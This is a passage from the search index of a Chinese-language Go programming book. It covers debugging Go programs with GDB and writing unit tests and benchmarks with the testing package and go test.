<p>\u542f\u52a8\u4e4b\u540e\u9996\u5148\u770b\u770b\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u4e0d\u662f\u53ef\u4ee5\u8fd0\u884c\u8d77\u6765\uff0c\u53ea\u8981\u8f93\u5165<code>run</code>\u547d\u4ee4\u56de\u8f66\u540e\u7a0b\u5e8f\u5c31\u5f00\u59cb\u8fd0\u884c\uff0c\u7a0b\u5e8f\u6b63\u5e38\u7684\u8bdd\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u8f93\u51fa\u5982\u4e0b\uff0c\u548c\u6211\u4eec\u5728\u547d\u4ee4\u884c\u76f4\u63a5\u6267\u884c\u7a0b\u5e8f\u8f93\u51fa\u662f\u4e00\u6837\u7684\uff1a</p> <pre><code>(gdb) run\nStarting program: /home/xiemengjun/gdbfile \nStarting main\ncount: 0\ncount: 1\ncount: 2\ncount: 3\ncount: 4\ncount: 5\ncount: 6\ncount: 7\ncount: 8\ncount: 9\n[LWP 2771 exited]\n[Inferior 1 (process 2771) exited normally]\n</code></pre> <p>\u597d\u4e86\uff0c\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u600e\u4e48\u8ba9\u7a0b\u5e8f\u8dd1\u8d77\u6765\u4e86\uff0c\u63a5\u4e0b\u6765\u5f00\u59cb\u7ed9\u4ee3\u7801\u8bbe\u7f6e\u65ad\u70b9\uff1a</p> <pre><code>(gdb) b 23\nBreakpoint 1 at 0x400d8d: file /home/xiemengjun/gdbfile.go, line 23.\n(gdb) run\nStarting program: /home/xiemengjun/gdbfile \nStarting main\n[New LWP 3284]\n[Switching to LWP 3284]\n\nBreakpoint 1, main.main () at /home/xiemengjun/gdbfile.go:23\n23          fmt.Println(\"count:\", count)\n</code></pre> <p>\u4e0a\u9762\u4f8b\u5b50<code>b 23</code>\u8868\u793a\u5728\u7b2c23\u884c\u8bbe\u7f6e\u4e86\u65ad\u70b9\uff0c\u4e4b\u540e\u8f93\u5165<code>run</code>\u5f00\u59cb\u8fd0\u884c\u7a0b\u5e8f\u3002\u73b0\u5728\u7a0b\u5e8f\u5728\u524d\u9762\u8bbe\u7f6e\u65ad\u70b9\u7684\u5730\u65b9\u505c\u4f4f\u4e86\uff0c\u6211\u4eec\u9700\u8981\u67e5\u770b\u65ad\u70b9\u76f8\u5e94\u4e0a\u4e0b\u6587\u7684\u6e90\u7801\uff0c\u8f93\u5165<code>list</code>\u5c31\u53ef\u4ee5\u770b\u5230\u6e90\u7801\u663e\u793a\u4ece\u5f53\u524d\u505c\u6b62\u884c\u7684\u524d\u4e94\u884c\u5f00\u59cb\uff1a</p> <pre><code>(gdb) list\n18      fmt.Println(msg)\n19      bus := make(chan int)\n20      msg = \"starting a gofunc\"\n21      go counting(bus)\n22      for count := range bus {\n23          fmt.Println(\"count:\", count)\n24      }\n25  }\n</code></pre> <p>\u73b0\u5728GDB\u5728\u8fd0\u884c\u5f53\u524d\u7684\u7a0b\u5e8f\u7684\u73af\u5883\u4e2d\u5df2\u7ecf\u4fdd\u7559\u4e86\u4e00\u4e9b\u6709\u7528\u7684\u8c03\u8bd5\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u9700\u6253\u5370\u51fa\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u67e5\u770b\u76f8\u5e94\u53d8\u91cf\u7684\u7c7b\u578b\u53ca\u503c\uff1a</p> <pre><code>(gdb) info locals\ncount = 0\nbus = 0xf840001a50\n(gdb) p count\n$1 = 0\n(gdb) p bus\n$2 = (chan int) 0xf840001a50\n(gdb) whatis bus\ntype = chan int\n</code></pre> <p>\u63a5\u4e0b\u6765\u8be5\u8ba9\u7a0b\u5e8f\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\uff0c\u8bf7\u7ee7\u7eed\u770b\u4e0b\u9762\u7684\u547d\u4ee4</p> <pre><code>(gdb) c\nContinuing.\ncount: 0\n[New LWP 3303]\n[Switching to LWP 3303]\n\nBreakpoint 1, main.main () at /home/xiemengjun/gdbfile.go:23\n23 fmt.Println(\"count:\", count)\n(gdb) c\nContinuing.\ncount: 1\n[Switching to LWP 3302]\n\nBreakpoint 1, main.main () at /home/xiemengjun/gdbfile.go:23\n23 fmt.Println(\"count:\", count)\n</code></pre> <p>\u6bcf\u6b21\u8f93\u5165<code>c</code>\u4e4b\u540e\u90fd\u4f1a\u6267\u884c\u4e00\u6b21\u4ee3\u7801\uff0c\u53c8\u8df3\u5230\u4e0b\u4e00\u6b21for\u5faa\u73af\uff0c\u7ee7\u7eed\u6253\u5370\u51fa\u6765\u76f8\u5e94\u7684\u4fe1\u606f\u3002</p> <p>\u8bbe\u60f3\u76ee\u524d\u9700\u8981\u6539\u53d8\u4e0a\u4e0b\u6587\u76f8\u5173\u53d8\u91cf\u7684\u4fe1\u606f\uff0c\u8df3\u8fc7\u4e00\u4e9b\u8fc7\u7a0b\uff0c\u5e76\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6b65\uff0c\u5f97\u51fa\u4fee\u6539\u540e\u60f3\u8981\u7684\u7ed3\u679c\uff1a</p> <pre><code>(gdb) info locals\ncount = 2\nbus = 0xf840001a50\n(gdb) set variable count=9\n(gdb) info locals\ncount = 9\nbus = 0xf840001a50\n(gdb) c\nContinuing.\ncount: 9\n[Switching to LWP 3302]\n\nBreakpoint 1, main.main () at /home/xiemengjun/gdbfile.go:23\n23 fmt.Println(\"count:\", count)\n</code></pre> <p>\u6700\u540e\u7a0d\u5fae\u601d\u8003\u4e00\u4e0b\uff0c\u524d\u9762\u6574\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u5230\u5e95\u521b\u5efa\u4e86\u591a\u5c11\u4e2agoroutine\uff0c\u6bcf\u4e2agoroutine\u90fd\u5728\u505a\u4ec0\u4e48\uff1a</p> <pre><code>(gdb) info goroutines\n* 1 running runtime.gosched\n* 2 syscall runtime.entersyscall \n3 waiting runtime.gosched \n4 runnable runtime.gosched\n(gdb) goroutine 1 bt\n#0 0x000000000040e33b in runtime.gosched () at /home/xiemengjun/go/src/pkg/runtime/proc.c:927\n#1 0x0000000000403091 in runtime.chanrecv (c=void, ep=void, selected=void, received=void)\nat /home/xiemengjun/go/src/pkg/runtime/chan.c:327\n#2 0x000000000040316f in runtime.chanrecv2 (t=void, c=void)\nat /home/xiemengjun/go/src/pkg/runtime/chan.c:420\n#3 0x0000000000400d6f in main.main () at /home/xiemengjun/gdbfile.go:22\n#4 0x000000000040d0c7 in runtime.main () at /home/xiemengjun/go/src/pkg/runtime/proc.c:244\n#5 0x000000000040d16a in schedunlock () at /home/xiemengjun/go/src/pkg/runtime/proc.c:267\n#6 0x0000000000000000 in ?? ()\n</code></pre> <p>\u901a\u8fc7\u67e5\u770bgoroutines\u7684\u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u5730\u4e86\u89e3goruntine\u5185\u90e8\u662f\u600e\u4e48\u6267\u884c\u7684\uff0c\u6bcf\u4e2a\u51fd\u6570\u7684\u8c03\u7528\u987a\u5e8f\u5df2\u7ecf\u660e\u660e\u767d\u767d\u5730\u663e\u793a\u51fa\u6765\u4e86\u3002</p>"},{"location":"11.2/#_3","title":"\u5c0f\u7ed3","text":"<p>\u672c\u5c0f\u8282\u6211\u4eec\u4ecb\u7ecd\u4e86GDB\u8c03\u8bd5Go\u7a0b\u5e8f\u7684\u4e00\u4e9b\u57fa\u672c\u547d\u4ee4\uff0c\u5305\u62ec<code>run</code>\u3001<code>print</code>\u3001<code>info</code>\u3001<code>set variable</code>\u3001<code>coutinue</code>\u3001<code>list</code>\u3001<code>break</code>    \u7b49\u7ecf\u5e38\u7528\u5230\u7684\u8c03\u8bd5\u547d\u4ee4\uff0c\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6f14\u793a\uff0c\u6211\u76f8\u4fe1\u8bfb\u8005\u5df2\u7ecf\u5bf9\u4e8e\u901a\u8fc7GDB\u8c03\u8bd5Go\u7a0b\u5e8f\u6709\u4e86\u57fa\u672c\u7684\u7406\u89e3\uff0c\u5982\u679c\u4f60\u60f3\u83b7\u53d6\u66f4\u591a\u7684\u8c03\u8bd5\u6280\u5de7\u8bf7\u53c2\u8003\u5b98\u65b9\u7f51\u7ad9\u7684GDB\u8c03\u8bd5\u624b\u518c\uff0c\u8fd8\u6709GDB\u5b98\u65b9\u7f51\u7ad9\u7684\u624b\u518c\u3002 </p>"},{"location":"11.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9519\u8bef\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b</li> </ul>"},{"location":"11.3/","title":"11.3 Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b","text":"<p>\u5f00\u53d1\u7a0b\u5e8f\u5176\u4e2d\u5f88\u91cd\u8981\u7684\u4e00\u70b9\u662f\u6d4b\u8bd5\uff0c\u6211\u4eec\u5982\u4f55\u4fdd\u8bc1\u4ee3\u7801\u7684\u8d28\u91cf\uff0c\u5982\u4f55\u4fdd\u8bc1\u6bcf\u4e2a\u51fd\u6570\u662f\u53ef\u8fd0\u884c\uff0c\u8fd0\u884c\u7ed3\u679c\u662f\u6b63\u786e\u7684\uff0c\u53c8\u5982\u4f55\u4fdd\u8bc1\u5199\u51fa\u6765\u7684\u4ee3\u7801\u6027\u80fd\u662f\u597d\u7684\uff0c\u6211\u4eec\u77e5\u9053\u5355\u5143\u6d4b\u8bd5\u7684\u91cd\u70b9\u5728\u4e8e\u53d1\u73b0\u7a0b\u5e8f\u8bbe\u8ba1\u6216\u5b9e\u73b0\u7684\u903b\u8f91\u9519\u8bef\uff0c\u4f7f\u95ee\u9898\u53ca\u65e9\u66b4\u9732\uff0c\u4fbf\u4e8e\u95ee\u9898\u7684\u5b9a\u4f4d\u89e3\u51b3\uff0c\u800c\u6027\u80fd\u6d4b\u8bd5\u7684\u91cd\u70b9\u5728\u4e8e\u53d1\u73b0\u7a0b\u5e8f\u8bbe\u8ba1\u4e0a\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u8ba9\u7ebf\u4e0a\u7684\u7a0b\u5e8f\u80fd\u591f\u5728\u9ad8\u5e76\u53d1\u7684\u60c5\u51b5\u4e0b\u8fd8\u80fd\u4fdd\u6301\u7a33\u5b9a\u3002\u672c\u5c0f\u8282\u5c06\u5e26\u7740\u8fd9\u4e00\u8fde\u4e32\u7684\u95ee\u9898\u6765\u8bb2\u89e3Go\u8bed\u8a00\u4e2d\u5982\u4f55\u6765\u5b9e\u73b0\u5355\u5143\u6d4b\u8bd5\u548c\u6027\u80fd\u6d4b\u8bd5\u3002</p> <p>Go\u8bed\u8a00\u4e2d\u81ea\u5e26\u6709\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u6d4b\u8bd5\u6846\u67b6<code>testing</code>\u548c\u81ea\u5e26\u7684<code>go test</code>\u547d\u4ee4\u6765\u5b9e\u73b0\u5355\u5143\u6d4b\u8bd5\u548c\u6027\u80fd\u6d4b\u8bd5\uff0c<code>testing</code>\u6846\u67b6\u548c\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u6d4b\u8bd5\u6846\u67b6\u7c7b\u4f3c\uff0c\u4f60\u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u6846\u67b6\u5199\u9488\u5bf9\u76f8\u5e94\u51fd\u6570\u7684\u6d4b\u8bd5\u7528\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u57fa\u4e8e\u8be5\u6846\u67b6\u5199\u76f8\u5e94\u7684\u538b\u529b\u6d4b\u8bd5\u7528\u4f8b\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u4e00\u4e00\u6765\u770b\u4e00\u4e0b\u600e\u4e48\u5199\u3002</p> <p>\u53e6\u5916\u5efa\u8bae\u5b89\u88c5gotests\u63d2\u4ef6\u81ea\u52a8\u751f\u6210\u6d4b\u8bd5\u4ee3\u7801:</p> <pre><code>go get -u -v github.com/cweill/gotests/...\n</code></pre>"},{"location":"11.3/#_1","title":"\u5982\u4f55\u7f16\u5199\u6d4b\u8bd5\u7528\u4f8b","text":"<p>\u7531\u4e8e<code>go test</code>\u547d\u4ee4\u53ea\u80fd\u5728\u4e00\u4e2a\u76f8\u5e94\u7684\u76ee\u5f55\u4e0b\u6267\u884c\u6240\u6709\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u65b0\u5efa\u4e00\u4e2a\u9879\u76ee\u76ee\u5f55<code>gotest</code>,\u8fd9\u6837\u6211\u4eec\u6240\u6709\u7684\u4ee3\u7801\u548c\u6d4b\u8bd5\u4ee3\u7801\u90fd\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u521b\u5efa\u4e24\u4e2a\u6587\u4ef6\uff1agotest.go\u548cgotest_test.go</p> <ol> <li>gotest.go:\u8fd9\u4e2a\u6587\u4ef6\u91cc\u9762\u6211\u4eec\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u5305\uff0c\u91cc\u9762\u6709\u4e00\u4e2a\u51fd\u6570\u5b9e\u73b0\u4e86\u9664\u6cd5\u8fd0\u7b97:</li> </ol> <pre><code>    package gotest\n\nimport (\n\"errors\"\n)\n\nfunc Division(a, b float64) (float64, error) {\nif b == 0 {\nreturn 0, errors.New(\"\u9664\u6570\u4e0d\u80fd\u4e3a0\")\n}\n\nreturn a / b, nil\n}\n</code></pre> <ol> <li> <p>gotest_test.go:\u8fd9\u662f\u6211\u4eec\u7684\u5355\u5143\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4f46\u662f\u8bb0\u4f4f\u4e0b\u9762\u7684\u8fd9\u4e9b\u539f\u5219\uff1a</p> <ul> <li>\u6587\u4ef6\u540d\u5fc5\u987b\u662f<code>_test.go</code>\u7ed3\u5c3e\u7684\uff0c\u8fd9\u6837\u5728\u6267\u884c<code>go test</code>\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u5230\u76f8\u5e94\u7684\u4ee3\u7801</li> <li>\u4f60\u5fc5\u987bimport <code>testing</code>\u8fd9\u4e2a\u5305</li> <li>\u6240\u6709\u7684\u6d4b\u8bd5\u7528\u4f8b\u51fd\u6570\u5fc5\u987b\u662f<code>Test</code>\u5f00\u5934</li> <li>\u6d4b\u8bd5\u7528\u4f8b\u4f1a\u6309\u7167\u6e90\u4ee3\u7801\u4e2d\u5199\u7684\u987a\u5e8f\u4f9d\u6b21\u6267\u884c</li> <li>\u6d4b\u8bd5\u51fd\u6570<code>TestXxx()</code>\u7684\u53c2\u6570\u662f<code>testing.T</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u7c7b\u578b\u6765\u8bb0\u5f55\u9519\u8bef\u6216\u8005\u662f\u6d4b\u8bd5\u72b6\u6001</li> <li>\u6d4b\u8bd5\u683c\u5f0f\uff1a<code>func TestXxx (t *testing.T)</code>,<code>Xxx</code>\u90e8\u5206\u53ef\u4ee5\u4e3a\u4efb\u610f\u7684\u5b57\u6bcd\u6570\u5b57\u7684\u7ec4\u5408\uff0c\u4f46\u662f\u9996\u5b57\u6bcd\u4e0d\u80fd\u662f\u5c0f\u5199\u5b57\u6bcd[a-z]\uff0c\u4f8b\u5982<code>Testintdiv</code>\u662f\u9519\u8bef\u7684\u51fd\u6570\u540d\u3002</li> <li>\u51fd\u6570\u4e2d\u901a\u8fc7\u8c03\u7528<code>testing.T</code>\u7684<code>Error</code>, <code>Errorf</code>, <code>FailNow</code>, <code>Fatal</code>, <code>FatalIf</code>\u65b9\u6cd5\uff0c\u8bf4\u660e\u6d4b\u8bd5\u4e0d\u901a\u8fc7\uff0c\u8c03\u7528<code>Log</code>\u65b9\u6cd5\u7528\u6765\u8bb0\u5f55\u6d4b\u8bd5\u7684\u4fe1\u606f\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u6211\u4eec\u7684\u6d4b\u8bd5\u7528\u4f8b\u7684\u4ee3\u7801\uff1a</p> </li> </ol> <pre><code>    package gotest\n\nimport (\n\"testing\"\n)\n\nfunc Test_Division_1(t *testing.T) {\nif i, e := Division(6, 2); i != 3 || e != nil { //try a unit test on function\nt.Error(\"\u9664\u6cd5\u51fd\u6570\u6d4b\u8bd5\u6ca1\u901a\u8fc7\") // \u5982\u679c\u4e0d\u662f\u5982\u9884\u671f\u7684\u90a3\u4e48\u5c31\u62a5\u9519\n} else {\nt.Log(\"\u7b2c\u4e00\u4e2a\u6d4b\u8bd5\u901a\u8fc7\u4e86\") //\u8bb0\u5f55\u4e00\u4e9b\u4f60\u671f\u671b\u8bb0\u5f55\u7684\u4fe1\u606f\n}\n}\n\nfunc Test_Division_2(t *testing.T) {\nt.Error(\"\u5c31\u662f\u4e0d\u901a\u8fc7\")\n}\n</code></pre> <pre><code>\u6211\u4eec\u5728\u9879\u76ee\u76ee\u5f55\u4e0b\u9762\u6267\u884c`go test`,\u5c31\u4f1a\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff1a\n\n    --- FAIL: Test_Division_2 (0.00 seconds)\n        gotest_test.go:16: \u5c31\u662f\u4e0d\u901a\u8fc7\n    FAIL\n    exit status 1\n    FAIL    gotest  0.013s\n\u4ece\u8fd9\u4e2a\u7ed3\u679c\u663e\u793a\u6d4b\u8bd5\u6ca1\u6709\u901a\u8fc7\uff0c\u56e0\u4e3a\u5728\u7b2c\u4e8c\u4e2a\u6d4b\u8bd5\u51fd\u6570\u4e2d\u6211\u4eec\u5199\u6b7b\u4e86\u6d4b\u8bd5\u4e0d\u901a\u8fc7\u7684\u4ee3\u7801`t.Error`\uff0c\u90a3\u4e48\u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u51fd\u6570\u6267\u884c\u7684\u60c5\u51b5\u600e\u4e48\u6837\u5462\uff1f\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6267\u884c`go test`\u662f\u4e0d\u4f1a\u663e\u793a\u6d4b\u8bd5\u901a\u8fc7\u7684\u4fe1\u606f\u7684\uff0c\u6211\u4eec\u9700\u8981\u5e26\u4e0a\u53c2\u6570`go test -v`\uff0c\u8fd9\u6837\u5c31\u4f1a\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff1a\n\n    === RUN Test_Division_1\n    --- PASS: Test_Division_1 (0.00 seconds)\n        gotest_test.go:11: \u7b2c\u4e00\u4e2a\u6d4b\u8bd5\u901a\u8fc7\u4e86\n    === RUN Test_Division_2\n    --- FAIL: Test_Division_2 (0.00 seconds)\n        gotest_test.go:16: \u5c31\u662f\u4e0d\u901a\u8fc7\n    FAIL\n    exit status 1\n    FAIL    gotest  0.012s\n\u4e0a\u9762\u7684\u8f93\u51fa\u8be6\u7ec6\u7684\u5c55\u793a\u4e86\u8fd9\u4e2a\u6d4b\u8bd5\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u770b\u5230\u6d4b\u8bd5\u51fd\u65701`Test_Division_1`\u6d4b\u8bd5\u901a\u8fc7\uff0c\u800c\u6d4b\u8bd5\u51fd\u65702`Test_Division_2`\u6d4b\u8bd5\u5931\u8d25\u4e86\uff0c\u6700\u540e\u5f97\u51fa\u7ed3\u8bba\u6d4b\u8bd5\u4e0d\u901a\u8fc7\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u628a\u6d4b\u8bd5\u51fd\u65702\u4fee\u6539\u6210\u5982\u4e0b\u4ee3\u7801\uff1a\n</code></pre> <p><pre><code>    func Test_Division_2(t *testing.T) {\nif _, e := Division(6, 0); e == nil { //try a unit test on function\nt.Error(\"Division did not work as expected.\") // \u5982\u679c\u4e0d\u662f\u5982\u9884\u671f\u7684\u90a3\u4e48\u5c31\u62a5\u9519\n} else {\nt.Log(\"one test passed.\", e) //\u8bb0\u5f55\u4e00\u4e9b\u4f60\u671f\u671b\u8bb0\u5f55\u7684\u4fe1\u606f\n}\n}   </code></pre>     \u7136\u540e\u6211\u4eec\u6267\u884c<code>go test -v</code>\uff0c\u5c31\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff0c\u6d4b\u8bd5\u901a\u8fc7\u4e86\uff1a</p> <pre><code>    === RUN Test_Division_1\n    --- PASS: Test_Division_1 (0.00 seconds)\n        gotest_test.go:11: \u7b2c\u4e00\u4e2a\u6d4b\u8bd5\u901a\u8fc7\u4e86\n    === RUN Test_Division_2\n    --- PASS: Test_Division_2 (0.00 seconds)\n        gotest_test.go:20: one test passed. \u9664\u6570\u4e0d\u80fd\u4e3a0\n    PASS\n    ok      gotest  0.013s\n</code></pre>"},{"location":"11.3/#_2","title":"\u5982\u4f55\u7f16\u5199\u538b\u529b\u6d4b\u8bd5","text":"<p>\u538b\u529b\u6d4b\u8bd5\u7528\u6765\u68c0\u6d4b\u51fd\u6570(\u65b9\u6cd5\uff09\u7684\u6027\u80fd\uff0c\u548c\u7f16\u5199\u5355\u5143\u529f\u80fd\u6d4b\u8bd5\u7684\u65b9\u6cd5\u7c7b\u4f3c,\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9\uff1a</p> <ul> <li>\u538b\u529b\u6d4b\u8bd5\u7528\u4f8b\u5fc5\u987b\u9075\u5faa\u5982\u4e0b\u683c\u5f0f\uff0c\u5176\u4e2dXXX\u53ef\u4ee5\u662f\u4efb\u610f\u5b57\u6bcd\u6570\u5b57\u7684\u7ec4\u5408\uff0c\u4f46\u662f\u9996\u5b57\u6bcd\u4e0d\u80fd\u662f\u5c0f\u5199\u5b57\u6bcd</li> </ul> <pre><code>    func BenchmarkXXX(b *testing.B) { ... }\n</code></pre> <ul> <li><code>go test</code>\u4e0d\u4f1a\u9ed8\u8ba4\u6267\u884c\u538b\u529b\u6d4b\u8bd5\u7684\u51fd\u6570\uff0c\u5982\u679c\u8981\u6267\u884c\u538b\u529b\u6d4b\u8bd5\u9700\u8981\u5e26\u4e0a\u53c2\u6570<code>-test.bench</code>\uff0c\u8bed\u6cd5:<code>-test.bench=\"test_name_regex\"</code>,\u4f8b\u5982<code>go test -test.bench=\".*\"</code>\u8868\u793a\u6d4b\u8bd5\u5168\u90e8\u7684\u538b\u529b\u6d4b\u8bd5\u51fd\u6570</li> <li>\u5728\u538b\u529b\u6d4b\u8bd5\u7528\u4f8b\u4e2d,\u8bf7\u8bb0\u5f97\u5728\u5faa\u73af\u4f53\u5185\u4f7f\u7528<code>testing.B.N</code>,\u4ee5\u4f7f\u6d4b\u8bd5\u53ef\u4ee5\u6b63\u5e38\u7684\u8fd0\u884c</li> <li>\u6587\u4ef6\u540d\u4e5f\u5fc5\u987b\u4ee5<code>_test.go</code>\u7ed3\u5c3e</li> </ul> <p>\u4e0b\u9762\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a\u538b\u529b\u6d4b\u8bd5\u6587\u4ef6webbench_test.go\uff0c\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>package gotest\n\nimport (\n\"testing\"\n)\n\nfunc Benchmark_Division(b *testing.B) {\nfor i := 0; i &lt; b.N; i++ { //use b.N for looping \nDivision(4, 5)\n}\n}\n\nfunc Benchmark_TimeConsumingFunction(b *testing.B) {\nb.StopTimer() //\u8c03\u7528\u8be5\u51fd\u6570\u505c\u6b62\u538b\u529b\u6d4b\u8bd5\u7684\u65f6\u95f4\u8ba1\u6570\n\n//\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u5de5\u4f5c,\u4f8b\u5982\u8bfb\u53d6\u6587\u4ef6\u6570\u636e,\u6570\u636e\u5e93\u8fde\u63a5\u4e4b\u7c7b\u7684,\n//\u8fd9\u6837\u8fd9\u4e9b\u65f6\u95f4\u4e0d\u5f71\u54cd\u6211\u4eec\u6d4b\u8bd5\u51fd\u6570\u672c\u8eab\u7684\u6027\u80fd\n\nb.StartTimer() //\u91cd\u65b0\u5f00\u59cb\u65f6\u95f4\nfor i := 0; i &lt; b.N; i++ {\nDivision(4, 5)\n}\n}\n</code></pre> <p>\u6211\u4eec\u6267\u884c\u547d\u4ee4<code>go test webbench_test.go -test.bench=\".*\"</code>\uff0c\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u7ed3\u679c\uff1a <pre><code>Benchmark_Division-4                         500000000        7.76 ns/op         456 B/op         14 allocs/op\nBenchmark_TimeConsumingFunction-4            500000000        7.80 ns/op         224 B/op          4 allocs/op\nPASS\nok      gotest  9.364s\n</code></pre></p> <p>\u4e0a\u9762\u7684\u7ed3\u679c\u663e\u793a\u6211\u4eec\u6ca1\u6709\u6267\u884c\u4efb\u4f55<code>TestXXX</code>\u7684\u5355\u5143\u6d4b\u8bd5\u51fd\u6570\uff0c\u663e\u793a\u7684\u7ed3\u679c\u53ea\u6267\u884c\u4e86\u538b\u529b\u6d4b\u8bd5\u51fd\u6570\uff0c\u7b2c\u4e00\u6761\u663e\u793a\u4e86<code>Benchmark_Division</code>\u6267\u884c\u4e86500000000\u6b21\uff0c\u6bcf\u6b21\u7684\u6267\u884c\u5e73\u5747\u65f6\u95f4\u662f7.76\u7eb3\u79d2\uff0c\u7b2c\u4e8c\u6761\u663e\u793a\u4e86<code>Benchmark_TimeConsumingFunction</code>\u6267\u884c\u4e86500000000\uff0c\u6bcf\u6b21\u7684\u5e73\u5747\u6267\u884c\u65f6\u95f4\u662f7.80\u7eb3\u79d2\u3002\u6700\u540e\u4e00\u6761\u663e\u793a\u603b\u5171\u7684\u6267\u884c\u65f6\u95f4\u3002</p>"},{"location":"11.3/#_3","title":"\u5c0f\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u5bf9\u5355\u5143\u6d4b\u8bd5\u548c\u538b\u529b\u6d4b\u8bd5\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230<code>testing</code>\u5305\u5f88\u8f7b\u91cf\uff0c\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\u548c\u538b\u529b\u6d4b\u8bd5\u7528\u4f8b\u975e\u5e38\u7b80\u5355\uff0c\u914d\u5408\u5185\u7f6e\u7684<code>go test</code>\u547d\u4ee4\u5c31\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8fd9\u6837\u5728\u6211\u4eec\u6bcf\u6b21\u4fee\u6539\u5b8c\u4ee3\u7801,\u6267\u884c\u4e00\u4e0bgo test\u5c31\u53ef\u4ee5\u7b80\u5355\u7684\u5b8c\u6210\u56de\u5f52\u6d4b\u8bd5\u4e86\u3002</p>"},{"location":"11.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u4f7f\u7528GDB\u8c03\u8bd5</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"11.4/","title":"11.4 \u5c0f\u7ed3","text":"<p>\u672c\u7ae0\u6211\u4eec\u901a\u8fc7\u4e09\u4e2a\u5c0f\u8282\u5206\u522b\u4ecb\u7ecd\u4e86Go\u8bed\u8a00\u4e2d\u5982\u4f55\u5904\u7406\u9519\u8bef\uff0c\u5982\u4f55\u8bbe\u8ba1\u9519\u8bef\u5904\u7406\uff0c\u7136\u540e\u7b2c\u4e8c\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u901a\u8fc7GDB\u6765\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u901a\u8fc7GDB\u6211\u4eec\u53ef\u4ee5\u5355\u6b65\u8c03\u8bd5\u3001\u53ef\u4ee5\u67e5\u770b\u53d8\u91cf\u3001\u4fee\u6539\u53d8\u91cf\u3001\u6253\u5370\u6267\u884c\u8fc7\u7a0b\u7b49\uff0c\u6700\u540e\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u5229\u7528Go\u8bed\u8a00\u81ea\u5e26\u7684\u8f7b\u91cf\u7ea7\u6846\u67b6<code>testing</code>\u6765\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\u548c\u538b\u529b\u6d4b\u8bd5\uff0c\u4f7f\u7528<code>go test</code>\u5c31\u53ef\u4ee5\u65b9\u4fbf\u7684\u6267\u884c\u8fd9\u4e9b\u6d4b\u8bd5\uff0c\u4f7f\u5f97\u6211\u4eec\u5c06\u6765\u4ee3\u7801\u5347\u7ea7\u4fee\u6539\u4e4b\u540e\u5f88\u65b9\u4fbf\u7684\u8fdb\u884c\u56de\u5f52\u6d4b\u8bd5\u3002\u8fd9\u4e00\u7ae0\u4e5f\u8bb8\u5bf9\u4e8e\u4f60\u7f16\u5199\u7a0b\u5e8f\u903b\u8f91\u6ca1\u6709\u4efb\u4f55\u5e2e\u52a9\uff0c\u4f46\u662f\u5bf9\u4e8e\u4f60\u7f16\u5199\u51fa\u6765\u7684\u7a0b\u5e8f\u4ee3\u7801\u4fdd\u6301\u9ad8\u8d28\u91cf\u662f\u81f3\u5173\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u4e00\u4e2a\u597d\u7684Web\u5e94\u7528\u5fc5\u5b9a\u6709\u826f\u597d\u7684\u9519\u8bef\u5904\u7406\u673a\u5236(\u9519\u8bef\u63d0\u793a\u7684\u53cb\u597d\u3001\u53ef\u6269\u5c55\u6027)\u3001\u6709\u597d\u7684\u5355\u5143\u6d4b\u8bd5\u548c\u538b\u529b\u6d4b\u8bd5\u4ee5\u4fdd\u8bc1\u4e0a\u7ebf\u4e4